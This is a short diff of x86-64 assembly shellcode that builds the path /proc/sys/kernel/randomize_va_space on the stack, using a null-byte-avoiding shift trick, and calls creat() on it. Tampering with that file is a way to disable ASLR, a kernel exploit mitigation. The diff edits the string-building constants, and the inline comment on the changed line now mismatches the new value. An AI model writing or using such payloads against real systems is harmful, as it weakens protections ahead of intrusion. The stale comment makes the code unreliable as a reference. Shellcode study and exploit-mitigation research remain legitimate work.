@@ -9,8 +9,8 @@ global _start
 
 _start:
 	;; creat("/proc/sys/kernel/randomize_va_space", 0700)
-	mov rdi, 0x656361ffffffffff	;; rdi = "\xFF\xFF\xFF\xFF\xFFace"
-	shr rdi, 40			;; rdi = "ace"
+	mov rdi, 0x656361ff		;; rdi = "\xFF\xFF\xFF\xFF\xFFace"
+	shr rdi, 8			;; rdi = "ace"
 	push rdi
 	mov rdi, 0x70735f61765f657a	;; rdi = "ze_va_sp"
 	push rdi
@@ -21,6 +21,7 @@ _start:
 	mov rdi, 0x79732f636f72702f	;; rdi = "/proc/sy"
 	push rdi
 	mov rdi, rsp
+
 	xor rax, rax
 	mov ax, 700o
 	xor rsi, rsi
